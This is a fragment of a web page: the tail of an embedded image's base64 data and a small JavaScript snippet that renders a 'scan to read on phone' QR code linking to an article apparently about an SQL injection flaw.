jRo952JnW5NQC87BeOVpHeoIzvOVC+hfyX8q/ZSFufHXjrK24+3269PZ6zfVW7TNxP8PcueGjeakFR/XoqQeJRfIK9crfspA68Ir/7A7sFlI32OOjo/St6tZWvPJXrfao+ySbr1iP7JzqXWm1voqdt6p1Ta/nhNX0RuvYLUTzxa+5A3Mhbu8ZPrrUVe+Rt+o+JfZbM6985LUnrCfxEZz5jNcZentvdD1ytMD8jJ0Xngs5a7hqP3cHroX83L1+6qT/AQAA//8+de6RAAAABklEQVQDAOiVaZVqK8+HAAAAAElFTkSuQmCC)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/metasoft-mcc\_login-workerid-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 